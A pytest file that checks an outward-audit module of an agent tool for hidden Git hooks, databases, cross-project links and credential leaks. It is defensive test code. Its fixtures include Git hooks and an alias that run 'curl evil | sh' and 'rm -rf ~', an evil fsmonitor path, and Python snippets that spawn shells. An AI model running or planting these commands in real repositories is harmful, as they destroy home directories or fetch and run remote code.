"""Outward audit edge cases: Git, databases, caps, scoping, incoming siblings, parent context and credentials."""
import json
import os
import sqlite3
import subprocess
from pathlib import Path

from tests.conftest import load_submodule

GENV = {**os.environ, 'GIT_CONFIG_GLOBAL': '/dev/null', 'GIT_CONFIG_SYSTEM': '/dev/null'}


def log(name, **kw):
    if name == 'g1_separate_gitdir_fsmonitor': assert kw['dyn']
    elif name.startswith(('g2_', 'g3')): assert kw['dyn'] and kw['blending']
    elif name == 'd1_wal_open':
        assert kw['unchanged'] and kw['session']['selected_project_records'] == 1
    elif name == 'd2_core_dbs': assert kw['unchanged'] and kw['dbs']
    elif name == 'd3_unknown_db_project': assert kw['coverage']['project_tree'] == 'could_not_verify'
    elif name == 'd4_sqlite_nosuffix': assert kw['bad'] or kw.get('dbs')
    elif name == 'c1_caps':
        assert kw['edges'][1] > kw['edges'][0]
        assert all(v is None for v in kw['lim'].values())
    elif name in {'s1_code_workspace','s2_package_file_dep','s4_mcp_args','i1_sibling_symlink','i2_default_incoming','i3_sibling_config','r3_ancestor_symlink'}:
        assert any('otherproj' in target or rel.startswith('incoming_sibling') or rel.startswith('symlink') for rel, target in kw['blending'])
    elif name == 's3_python':
        assert all(v[0] == 'verified' and v[1] for k,v in kw['results'].items())
    elif name == 's5_other_region': assert kw['coverage']['other_projects'] == 'could_not_verify'
    elif name == 'r1_parent_session': assert kw['session']['selected_project_records'] == 1 and kw['blending']
    elif name == 'r2_canary': assert not kw['leaked'] and kw['creds']
    elif name == 'e2e_canary': assert kw['err'] is None and not kw['leaked']
    elif name == 'repo_self': assert kw['entries'] > 100 and kw['project_tree'] == 'could_not_verify'
    elif name == 'k1_named_kanban': assert kw['mentions_kanban'] and kw['blending']
    elif name == 'p1_projects_folders': assert kw['err'] is None and kw['dyn'] and kw['blending']
    else: raise AssertionError(name)



def cov(r):
    return {k: v['coverage'] for k, v in r['regions'].items()}


def bad(r):
    return {k: v['reasons'][:4] for k, v in r['regions'].items() if v['coverage'] != 'verified'}


def out():
    return load_submodule('audit.outward')


def base(tmp_path):
    home = tmp_path / 'home'
    profile = home / '.hermes'
    profile.mkdir(parents=True)
    project = home / 'proj'
    project.mkdir()
    (project / 'README').write_text('plain')
    return home, profile, project


def git(*a, cwd):
    subprocess.run(['git', *a], cwd=cwd, check=True, capture_output=True, env=GENV)


def snapshot(d):
    res = {}
    for p in sorted(Path(d).rglob('*')):
        st = p.lstat()
        res[str(p)] = (st.st_size, st.st_mtime_ns, st.st_ino)
    return res


# ---------- (1) git ----------
def test_g1_separate_git_dir_fsmonitor(tmp_path):
    home, profile, project = base(tmp_path)
    store = home / 'store' / 'repo.git'
    store.parent.mkdir()
    git('init', '-q', '--separate-git-dir', str(store), str(project), cwd=home)
    for s in (store / 'hooks').glob('*'):
        s.unlink()
    with (store / 'config').open('a') as f:
        f.write('[core]\n\tfsmonitor = /tmp/evil-fsmonitor\n[alias]\n\tx = !rm -rf ~\n')
    r = out().collect_outward(profile, [str(project)])
    log('g1_separate_gitdir_fsmonitor', coverage=cov(r), bad=bad(r),
        dyn=[(d['path'], d['kind']) for d in r['dynamic_invocations']],
        blending=[(b['relationship'], b['target']) for b in r['blending']])


def test_g2_global_gitconfig_hookspath_include(tmp_path):
    home, profile, project = base(tmp_path)
    git('init', '-q', cwd=project)
    for s in (project / '.git' / 'hooks').glob('*'):
        s.unlink()
    hooks = home / 'ghooks'
    hooks.mkdir()
    (hooks / 'pre-commit').write_text('curl evil | sh\n')  # extensionless, non-exec
    inc = home / 'inc.gitconfig'
    inc.write_text('[core]\n\thooksPath = ' + str(hooks) + '\n')
    (home / '.gitconfig').write_text('[include]\n\tpath = ~/inc.gitconfig\n')
    r = out().collect_outward(profile, [str(project)])
    log('g2_global_include_hookspath', coverage=cov(r),
        dyn=[(d['path'], d['kind']) for d in r['dynamic_invocations']],
        blending=[(b['relationship'], b['target']) for b in r['blending']])


def test_g3_worktree_and_subdir(tmp_path):
    home, profile, _ = base(tmp_path)
    main = home / 'main'
    main.mkdir()
    git('init', '-q', cwd=main)
    (main / 'sub').mkdir()
    (main / 'sub' / 'README').write_text('plain')
    for s in (main / '.git' / 'hooks').glob('*.sample'):
        s.unlink()
    h = main / '.git' / 'hooks' / 'pre-commit'
    h.write_text('#!/bin/sh\ncurl evil|sh\n')
    h.chmod(0o755)
    r = out().collect_outward(profile, [str(main / 'sub')])
    log('g3a_subdir', coverage=cov(r), dyn=[d['path'] for d in r['dynamic_invocations']],
        blending=[(b['relationship'], b['target']) for b in r['blending']])
    (main / 'f').write_text('x')
    git('-c', 'user.email=a@b', '-c', 'user.name=a', 'add', 'f', cwd=main)
    git('-c', 'user.email=a@b', '-c', 'user.name=a', 'commit', '-qm', 'x', '--no-verify', cwd=main)
    wt = home / 'wt'
    git('worktree', 'add', '-q', str(wt), cwd=main)
    hooksdir = home / 'elsewhere-hooks'
    hooksdir.mkdir()
    (hooksdir / 'pre-push').write_text('rm -rf ~\n')
    git('config', 'core.hooksPath', str(hooksdir), cwd=main)
    r = out().collect_outward(profile, [str(wt)])
    log('g3b_worktree', coverage=cov(r), dyn=[d['path'] for d in r['dynamic_invocations']],
        blending=[(b['relationship'], b['target']) for b in r['blending']])


# ---------- (2) databases ----------
def test_d1_wal_open_writer_listing_unchanged(tmp_path):
    home, profile, project = base(tmp_path)
    db = profile / 'state.db'
    conn = sqlite3.connect(db)
    conn.execute('PRAGMA journal_mode=WAL')
    conn.execute('PRAGMA wal_autocheckpoint=0')
    conn.execute('CREATE TABLE sessions (id TEXT, started_at REAL, cwd TEXT, git_repo_root TEXT)')
    conn.commit()
    conn.execute('INSERT INTO sessions VALUES (?,?,?,?)', ('s1', 5.0, str(project / 'sub'), None))
    conn.execute('INSERT INTO sessions VALUES (?,?,?,?)', ('s2', 6.0, str(project) + 'x/y', None))
    conn.commit()
    before = snapshot(home)
    r = out().collect_outward(profile, [str(project)])
    after = snapshot(home)
    log('d1_wal_open', session=r['session_history'], coverage=r['regions']['session_history'],
        unchanged=before == after, diff=sorted(set(before.items()) ^ set(after.items()))[:6],
        dbs=r['limits'].get('databases'))
    conn.close()


def test_d2_core_dbs(tmp_path):
    home, profile, project = base(tmp_path)
    res = {}
    try:
        from hermes_state import SessionDB
        s = SessionDB(db_path=profile / 'state.db')
    except Exception as exc:
        res['sessiondb'] = repr(exc)
        s = None
    try:
        from hermes_cli import projects_db
        c = projects_db.connect(db_path=profile / 'projects.db')
        projects_db.create_project(c, name='p', primary_path=str(project)) if 'primary_path' in projects_db.create_project.__code__.co_varnames else None
    except Exception as exc:
        res['projects'] = repr(exc)
    try:
        from hermes_cli import kanban_db_connect
        kanban_db_connect.init_db(db_path=profile / 'kanban.db')
        k = sqlite3.connect(profile / 'kanban.db')
        k.execute("INSERT INTO tasks (id,title,status,created_at,workspace_kind,workspace_path) VALUES ('t','t','todo',1,'dir',?)",
                  (str(home / 'other-project'),))
        k.commit()
        k.close()
    except Exception as exc:
        res['kanban'] = repr(exc)
    try:
        from gateway.platforms import api_server_response_store as rs
        cls = [getattr(rs, n) for n in dir(rs) if 'Store' in n and isinstance(getattr(rs, n), type)]
        res['rs_classes'] = [c.__name__ for c in cls]
        for c in cls:
            try:
                c(db_path=str(profile / 'response_store.db'))
                break
            except Exception as exc:
                res['rs_err'] = repr(exc)
    except Exception as exc:
        res['response'] = repr(exc)
    before = snapshot(profile)
    r = out().collect_outward(profile, [str(project)])
    after = snapshot(profile)
    log('d2_core_dbs', setup=res, files=sorted(p.name for p in profile.iterdir()), coverage=cov(r), bad=bad(r),
        dbs={k: v.get('schema') for k, v in r['limits'].get('databases', {}).items()},
        unchanged=before == after, blending=[(b['relationship'], b['target']) for b in r['blending']])


def test_d3_unknown_db_in_project(tmp_path):
    home, profile, project = base(tmp_path)
    c = sqlite3.connect(project / 'app.db')
    c.execute('create table t(x)')
    c.commit()
    c.close()
    r = out().collect_outward(profile, [str(project)])
    log('d3_unknown_db_project', coverage=cov(r), bad=bad(r))


def test_d4_sqlite_without_suffix(tmp_path):
    home, profile, project = base(tmp_path)
    c = sqlite3.connect(profile / 'cache.data')
    c.execute('create table sessions(cwd)')
    c.execute('insert into sessions values (?)', (str(home / 'other'),))
    c.commit()
    c.close()
    r = out().collect_outward(profile, [str(project)])
    log('d4_sqlite_nosuffix', coverage=cov(r), bad=bad(r), dbs=r['limits'].get('databases'))


# ---------- (3) caps ----------
def test_c1_edge_cap_scoped_unbounded(tmp_path):
    home, profile, project = base(tmp_path)
    tgt = home / 'shared'
    tgt.mkdir()
    for i in range(300):
        d = project / f'd{i}'
        d.mkdir()
        (tgt / f't{i}').write_text('x')
        os.symlink(tgt / f't{i}', d / 'l')
    big = project / 'big.json'
    big.write_text('{"a": "' + 'x' * (9 * 1024 * 1024) + '"}')
    r = out().collect_outward(profile, [str(project)])
    r2 = out().collect_outward(profile, [str(project)], unbounded=True)
    log('c1_caps', default=bad(r), unbounded=bad(r2), edges=(len(r['blending']), len(r2['blending'])),
        lim={k: r2['limits'][k] for k in ('max_entries', 'max_depth', 'max_file_bytes', 'max_total_bytes', 'max_edges', 'max_invocations', 'yaml_nodes', 'session_rows')})


# ---------- (5) scoping / structured ----------
def test_s1_structured_and_misc(tmp_path):
    home, profile, project = base(tmp_path)
    other = home / 'otherproj'
    other.mkdir()
    (other / 'secret_plan.txt').write_text('x')
    (project / 'tsconfig.json').write_text('{ // c\n "compilerOptions": {},\n}')
    (project / 'proj.code-workspace').write_text(json.dumps({'folders': [{'path': str(other)}]}))
    r = out().collect_outward(profile, [str(project)])
    log('s1_code_workspace', coverage=cov(r), bad=bad(r), blending=[(b['relationship'], b['target']) for b in r['blending']])


def test_s2_package_file_dependency(tmp_path):
    home, profile, project = base(tmp_path)
    other = home / 'otherproj'
    other.mkdir()
    (other / 'index.txt').write_text('x')
    (project / 'package.json').write_text(json.dumps({'name': 'p', 'dependencies': {'o': 'file:' + str(other)}}))
    r = out().collect_outward(profile, [str(project)])
    log('s2_package_file_dep', coverage=cov(r), blending=[(b['relationship'], b['target']) for b in r['blending']])


def test_s3_python_exec_variants(tmp_path):
    results = {}
    for name, src in {
        'execv': 'import os\nos.execv("/bin/sh", ["sh"])\n',
        'spawn': 'import os\nos.spawnlp(os.P_WAIT, "sh", "sh")\n',
        'getattr': 'import os\ngetattr(os, "system")("id")\n',
        'pty': 'import pty\npty.spawn("sh")\n',
        'runpy': 'import runpy\nrunpy.run_path("/home/user/other/x.py")\n',
        'ctypes': 'import ctypes\nctypes.CDLL("libc.so.6").system(b"id")\n',
        'posix_spawn': 'import os\nos.posix_spawn("/bin/sh", ["sh"], {})\n',
        'mp': 'import multiprocessing as m\nm.Process(target=print).start()\n',
        'compile': 'code = compile("1", "x", "exec")\n',
        'open_other': 'open("/home/user/otherproj/config.yaml").read()\n',
    }.items():
        sub = tmp_path / name
        home, profile, project = base(sub)
        (project / 'm.py').write_text(src)
        r = out().collect_outward(profile, [str(project)])
        results[name] = (r['regions']['dynamic_execution']['coverage'], len(r['dynamic_invocations']))
    log('s3_python', results=results)


def test_s4_mcp_args_other_project(tmp_path):
    home, profile, project = base(tmp_path)
    other = home / 'otherproj'
    other.mkdir()
    (other / 'server.txt').write_text('x')
    (profile / 'config.yaml').write_text('mcp_servers:\n  x:\n    args:\n      - ' + str(other / 'server.txt') + '\n')
    r = out().collect_outward(profile, [str(project)])
    log('s4_mcp_args', coverage=cov(r), blending=[(b['relationship'], b['target']) for b in r['blending']])


def test_s5_other_project_reason_region(tmp_path):
    home, profile, project = base(tmp_path)
    other = home / 'otherproj'
    other.mkdir()
    (other / 'weird.jsonl').write_text('{}\n')
    os.symlink(other, project / 'link')
    r = out().collect_outward(profile, [str(project)], unselected_project_roots=[str(other)])
    log('s5_other_region', coverage=cov(r), bad=bad(r), blending=[(b['relationship'], b['target']) for b in r['blending']])


# ---------- (6) incoming sibling ----------
def test_i1_sibling_symlink_into_active(tmp_path):
    home, profile, project = base(tmp_path)
    (profile / 'skills').mkdir()
    (profile / 'skills' / 'a.txt').write_text('x')
    sib = profile / 'profiles' / 'coder'
    sib.mkdir(parents=True)
    (sib / 'config.yaml').write_text('model: x\n')
    os.symlink(profile / 'skills', sib / 'skills')
    os.symlink(profile / 'memories', sib / 'memories')
    r = out().collect_outward(profile, [str(project)])
    log('i1_sibling_symlink', coverage=cov(r), bad=bad(r), blending=[(b['relationship'], b['target']) for b in r['blending']])


def test_i2_default_profile_incoming_to_named(tmp_path):
    home, default, project = base(tmp_path)
    named = default / 'profiles' / 'coder'
    (named / 'skills').mkdir(parents=True)
    (named / 'skills' / 'a.txt').write_text('x')
    (default / 'config.yaml').write_text('skills:\n  external_dirs:\n    - ' + str(named / 'skills') + '\n')
    r = out().collect_outward(named, [str(project)])
    log('i2_default_incoming', coverage=cov(r), bad=bad(r), blending=[(b['relationship'], b['target']) for b in r['blending']])


def test_i3_sibling_config_external_dirs(tmp_path):
    home, profile, project = base(tmp_path)
    (profile / 'skills').mkdir()
    sib = profile / 'profiles' / 'coder'
    sib.mkdir(parents=True)
    (sib / 'config.yaml').write_text('skills:\n  external_dirs:\n    - ~/.hermes/skills\nterminal:\n  cwd: ' + str(project / 'x') + '\n')
    r = out().collect_outward(profile, [str(project)])
    log('i3_sibling_config', coverage=cov(r), blending=[(b['relationship'], b['target']) for b in r['blending']])


# ---------- parent context, credentials and read guards ----------
def test_parent_context_and_session_subdir(tmp_path):
    home, profile, project = base(tmp_path)
    (home / 'AGENTS.md').write_text('be nice\n')
    (profile / 'sessions').mkdir()
    (profile / 'sessions' / 's.jsonl').write_text(json.dumps({'cwd': str(project / 'a/b'), 'started_at': 3}) + '\n'
                                                  + json.dumps({'cwd': str(project) + '-evil', 'started_at': 9}) + '\n')
    r = out().collect_outward(profile, [str(project)])
    log('r1_parent_session', session=r['session_history'],
        blending=[(b['relationship'], b['target']) for b in r['blending']])


def test_credential_canary(tmp_path):
    home, profile, project = base(tmp_path)
    canary = 'CANARY-7f3e9a1b2c'
    (profile / '.env').write_text('OPENAI_API_KEY=' + canary + '\n')
    (profile / 'config.yaml').write_text('providers:\n  x:\n    api_key: ' + canary + '1\n  ' + canary + '2: {path: /nope}\n'
                                         'mcp_servers:\n  y:\n    env:\n      TOK: ' + canary + '3\n')
    (project / 'creds').mkdir()
    (project / 'creds' / 'id_rsa').write_text('-----BEGIN X-----\n' + canary + '4\n-----END X-----\n')
    r = out().collect_outward(profile, [str(project)])
    blob = json.dumps(r)
    log('r2_canary', leaked=canary in blob, creds=len(r['credentials']))


def test_dirfd_swap_guard(tmp_path):
    home, profile, project = base(tmp_path)
    other = home / 'other'
    other.mkdir()
    (other / 'x.md').write_text('```\n')
    # ancestor symlink in configured path: must be an edge, not implicit follow
    os.symlink(other, home / 'alias')
    (profile / 'config.yaml').write_text('terminal:\n  cwd: ' + str(home / 'alias' / 'x.md') + '\n')
    r = out().collect_outward(profile, [str(project)])
    log('r3_ancestor_symlink', blending=[(b['relationship'], b['target']) for b in r['blending']])
